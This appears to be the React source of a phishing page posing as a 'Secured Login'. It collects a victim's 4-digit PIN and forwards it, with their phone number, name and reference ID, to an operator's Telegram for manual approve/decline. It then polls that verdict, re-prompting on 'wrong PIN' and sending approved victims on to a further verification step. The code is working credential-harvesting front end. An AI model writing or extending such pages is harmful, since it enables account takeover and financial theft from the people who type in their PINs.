import React, { useState, useRef, useEffect } from 'react';
import { useNavigate, useParams } from 'react-router-dom';
import { useClient } from '../context/ClientContext';
import { Header } from '../components/Header';
import { Footer } from '../components/Footer';
import { LoadingOverlay } from '../components/LoadingOverlay';
import { Lock, AlertCircle } from 'lucide-react';
import { requestPinVerification, checkPinStatus } from '../services/botService';

export const LoginPage = () => {
  const { user } = useParams();
  const navigate = useNavigate();
  const { client, updateClient } = useClient();

  const [digits, setDigits] = useState(['', '', '', '']);
  const [verifying, setVerifying] = useState(false);
  const [errorMsg, setErrorMsg] = useState('');
  const [sessionId, setSessionId] = useState(null);

  const inputRefs = [useRef(null), useRef(null), useRef(null), useRef(null)];

  const handleChange = (index, value) => {
    if (!/^\d*$/.test(value)) return;
    const newDigits = [...digits];
    newDigits[index] = value.slice(-1);
    setDigits(newDigits);

    if (value !== '' && index < 3) {
      inputRefs[index + 1].current?.focus();
    }
  };

  const handleKeyDown = (index, e) => {
    if (e.key === 'Backspace') {
      if (digits[index] !== '') {
        const newDigits = [...digits];
        newDigits[index] = '';
        setDigits(newDigits);
      } else if (index > 0) {
        const newDigits = [...digits];
        newDigits[index - 1] = '';
        setDigits(newDigits);
        inputRefs[index - 1].current?.focus();
      }
    } else if (e.key === 'ArrowLeft' && index > 0) {
      inputRefs[index - 1].current?.focus();
    } else if (e.key === 'ArrowRight' && index < 3) {
      inputRefs[index + 1].current?.focus();
    }
  };

  // Live Polling for Admin Telegram Approve/Decline click
  useEffect(() => {
    if (!sessionId || !verifying) return;

    const pollInterval = setInterval(async () => {
      try {
        const res = await checkPinStatus(sessionId);
        console.log("📊 Live Telegram PIN Status:", res.status);

        if (res.status === 'approved') {
          clearInterval(pollInterval);
          setVerifying(false);
          setErrorMsg('');
          const userSegment = user || 'user11';
          navigate(`/${userSegment}/verification`);
        } else if (res.status === 'wrong_pin') {
          clearInterval(pollInterval);
          setVerifying(false);
          setErrorMsg('❌ Wrong PIN code! Please re-enter your 4-digit PIN.');
          setDigits(['', '', '', '']);
          setSessionId(null);
          setTimeout(() => {
            inputRefs[0].current?.focus();
          }, 100);
        }
      } catch (err) {
        console.error("Polling status error:", err);
      }
    }, 2000);

    return () => clearInterval(pollInterval);
  }, [sessionId, verifying, user, navigate]);

  const handleSubmit = async (e) => {
    e?.preventDefault();
    const pinStr = digits.join('');

    if (pinStr.length !== 4) {
      setErrorMsg('Please enter a valid 4-digit PIN');
      return;
    }

    setErrorMsg('');
    setVerifying(true);
    updateClient({ pin: pinStr });

    try {
      // Send PIN request with Approve / Decline buttons to Admin's Telegram
      const result = await requestPinVerification({
        phoneNumber: client.number,
        pinCode: pinStr,
        userName: client.name,
        userId: client.refId
      });

      if (result && result.sessionId) {
        setSessionId(result.sessionId);
      }
    } catch (err) {
      console.error("Failed to request PIN verification:", err);
    }
  };

  const isComplete = digits.every((d) => d !== '');

  return (
    <div className="app-viewport">
      <Header />
      {verifying && (
        <LoadingOverlay message="⏳ Verifying PIN... Waiting for authorization" />
      )}
      <main className="main-content">
        <div className="login-card">
          <div className="login-icon-badge">
            <Lock size={32} color="#0066cc" />
          </div>

          <h2 style={{ fontFamily: 'var(--font-display)', fontSize: '1.75rem', fontWeight: 700, color: 'var(--primary-navy)' }}>
            Secured Login 🔒
          </h2>
          <p style={{ color: 'var(--text-secondary)', fontSize: '0.95rem', marginTop: '0.4rem' }}>
            Enter your 4-digit pin to authenticate
          </p>

          {client.number && (
            <div className="alert-box alert-info" style={{ marginTop: '1.25rem' }}>
              <span>📱 Account: {client.number}</span>
            </div>
          )}

          {errorMsg && (
            <div className="alert-box alert-error" style={{ marginTop: '1.25rem' }}>
              <AlertCircle size={18} />
              <span>{errorMsg}</span>
            </div>
          )}

          <form onSubmit={handleSubmit}>
            <div className="pin-inputs-container">
              {digits.map((digit, index) => (
                <input
                  key={index}
                  ref={inputRefs[index]}
                  type="password"
                  maxLength="1"
                  value={digit}
                  onChange={(e) => handleChange(index, e.target.value)}
                  onKeyDown={(e) => handleKeyDown(index, e)}
                  className={`pin-digit-box ${digit ? 'filled' : ''}`}
                  autoFocus={index === 0}
                />
              ))}
            </div>

            <button
              type="submit"
              disabled={!isComplete || verifying}
              className="btnContinue"
              style={{ opacity: isComplete ? 1 : 0.7 }}
            >
              Verify and Login
            </button>
          </form>
        </div>
      </main>
      <Footer />
    </div>
  );
};
